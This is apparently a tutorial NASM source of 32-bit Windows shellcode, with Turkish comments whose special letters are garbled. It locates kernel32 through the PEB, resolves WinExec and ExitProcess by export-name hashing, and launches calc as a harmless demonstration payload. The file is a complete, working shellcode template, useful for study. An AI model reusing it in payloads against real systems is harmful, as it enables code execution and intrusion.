[BITS 32]

kernel32_bul:
xor ecx, ecx
mov esi, [fs:0x30] ; PEB adresi
mov esi, [esi + 0x0c] ; PEB LOADER DATA adresi
mov esi, [esi + 0x1c] ; Ba�lat�lma s�ras�na g�re mod�l listesinin ba�lang�� adresi

bir_sonraki_modul:
mov ebx, [esi + 0x08] ; Mod�l�n baz adresi
mov edi, [esi + 0x20] ; Mod�l ad�(unicode format�nda)
mov esi, [esi] ; esi = Mod�l listesinde bir sonraki mod�l meta datalar�n�n bulundu�u adres InInitOrder[X].flink(sonraki modul)
cmp [edi + 12*2], cl ; KERNEL32.DLL 12 karakterden olu�tu�u i�in 24. byte �n null olup olmad���n� kontrol ediyoruz.Bu y�ntem olabilecek en g�venli ve jenerik y�ntem de�il, ancak i�imizi g�r�yor.
jne bir_sonraki_modul ; E�er 24. byte null de�ilse kernel32.dll ismini bulamam���z demektir

push ebx ;Kernel32nin adresini stacke yaz
push 0x10121ee3 ;WinExec fonksiyon ad�n�n hashi
call fonksiyon_bul ;eax ile WinExec fonksiyonunun adresini d�nd�r�r
add esp, 4
pop ebx ; Kernel32nin adresini tekrar ebx e y�kle
push 0 ;calc metninin sonuna null karakter yerle�tirmek i�in stacke 0x00000000 yaz�yoruz
push 0x636C6163 ;calc metnini little endian formata uydurmak i�in tersten yaz�yoruz
mov ecx, esp ; calc metninin adresini ecx e y�kle
push 0 ; WinExec birinci parametre
push ecx ; WinExec ikinci parametre
call eax ; WinExec fonksiyonu �a�r�l�r
push ebx ; Kernel32nin adresini stacke yaz
push 0x3c3f99f8 ;ExitProcess fonksiyon ad�n�n hashi
call fonksiyon_bul ;eax ile WinExec fonksiyonunun adresini d�nd�r�r
push 0
call eax ;ExitProcess fonksiyonu �a�r�l�r

; Fonksiyon: Fonksiyon hashlerini kar��la�t�rarak fonksiyon adresini bulmak i�in.
; esp+8 de mod�l adresini, esp+4 te fonksiyon hashini al�r
; Fonksiyon adresini eax ile d�nd�r�r
fonksiyon_bul:
mov ebp, [esp + 0x08] ;Mod�l adresini al
mov eax, [ebp + 0x3c] ;MSDOS ba�l���n� atl�yoruz
mov edx, [ebp + eax + 0x78] ;Export tablosunun RVA adresini edx e yaz�yoruz
add edx, ebp ;Export tablosunun VA adresini hesapl�yoruz
mov ecx, [edx + 0x18] ;Export tablosundan toplam fonksiyon say�s�n� saya� olarak kullanmak �zere kaydediyoruz
mov ebx, [edx + 0x20] ;Export names tablosunun RVA adresini ebx e yaz�yoruz
add ebx, ebp ;Export names tablosunun VA adresini hesapl�yoruz

fonksiyon_bulma_dongusu:
dec ecx ;Saya� son fonksiyondan ba�layarak ba�a do�ru azalt�l�r
mov esi, [ebx + ecx * 4] ;Export names tablosunda s�ras� gelen fonksiyon ad�n�n pointer�n�n VA adresini hesapl�yoruz ve pointer � ESI a at�yoruz (pointer RVA format�nda)
add esi, ebp ;Fonksiyon pointer�n�n VA adresini hesapl�yoruz

hash_hesapla:
xor edi, edi
xor eax, eax
cld ;lods instruction� ESI register �n� yanl��l�kla a�a�� y�nde de�i�tirmesin diye emin olmak i�in kullan�yoruz

hash_hesaplama_dongusu:
lodsb ;ESI nin i�aret etti�i mevcut fonksiyon ad� harfini (yani bir byte�) AL register�na y�kl�yoruz ve ESI yi bir art�r�yoruz
test al, al ;Fonksiyon ad�n�n sonuna gelip gelmedi�imizi test ediyoruz
jz hash_hesaplandi ;AL register de�eri 0 ise, yani fonksiyon ad�n� tamamlam��sak hesaplamay� sona erdiriyoruz
ror edi, 0xf ;Hash de�erini 15 bit sa�a rotate ettiriyoruz
add edi, eax ;Hash de�erine mevcut karakteri ekliyoruz
jmp hash_hesaplama_dongusu

hash_hesaplandi:

hash_karsilastirma:
cmp edi, [esp + 0x04] ;Hesaplanan hash de�erinin stackte parametre olarak verilen fonksiyon hash de�eri ile tutup tutmad���n� kontrol ediyoruz
jnz fonksiyon_bulma_dongusu
mov ebx, [edx + 0x24] ;Fonksiyonun adresini bulabilmek i�in Export ordinals tablosunun RVA adresini tespit ediyoruz
add ebx, ebp ;Export ordinals tablosunun VA adresini hesapl�yoruz
mov cx, [ebx + 2 * ecx] ;Fonksiyonun Ordinal numaras�n� elde ediyoruz (ordinal numaras� 2 byte)
mov ebx, [edx + 0x1c] ;Export adres tablosunun RVA adresini tespit ediyoruz
add ebx, ebp ;Export adres tablosunun VA adresini hesapl�yoruz
mov eax, [ebx + 4 * ecx] ;Fonksiyonun ordinal numaras�n� kullanarak fonksiyon adresinin RVA adresini tespit ediyoruz
add eax, ebp ;Fonksiyonun VA adresini hesapl�yoruz

fonksiyon_bulundu:
ret